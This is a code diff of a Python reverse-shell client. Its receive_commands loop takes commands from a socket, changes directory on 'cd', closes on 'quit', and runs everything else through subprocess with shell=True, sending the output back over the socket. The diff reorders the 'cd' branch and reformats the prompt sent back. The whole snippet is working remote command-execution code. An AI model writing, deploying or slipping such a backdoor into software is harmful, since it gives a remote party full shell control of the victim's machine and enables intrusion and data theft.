@@ -32,26 +32,31 @@ def socket_connect():
 def receive_commands():
     while True:
         data = s.recv(1024)
-        if data[:2].decode("utf-8") == "cd":
-            try:
-                os.chdir(data[3:].decode("utf-8"))
-            except:
-                pass
         if data[:].decode("utf-8") == "quit":
             s.close()
             break
-        if len(data) > 0:
+        if data[:2].decode("utf-8") == "cd":
+            try:
+                os.chdir(data[3:].decode("utf-8"))
+                output_str = f"cd to {str(os.getcwd())}>"
+                s.send(str.encode(" "))
+                print(output_str)
+            except:
+                pass
+        elif len(data) > 0:
             try:
                 cmd = subprocess.Popen(data[:].decode(
                     "utf-8"), shell=True, stdout=subprocess.PIPE)
                 output_byte = cmd.stdout.read()  # + cmd.stderr.read()
                 output_str = str(output_byte, "utf-8")
-                s.send(str.encode(output_str + str(os.getcwd()) + "> "))
+                s.send(str.encode(f"{str(os.getcwd())}> \n {output_str}"))
                 print(output_str)
             except:
                 output_str = "Command not recognized\n"
-                s.send(str.encode(output_str + str(os.getcwd()) + "> "))
+                s.send(str.encode(f"{str(os.getcwd())}> \n {output_str}"))
                 print(output_str)
+        else:
+            pass
     s.close()
 
 
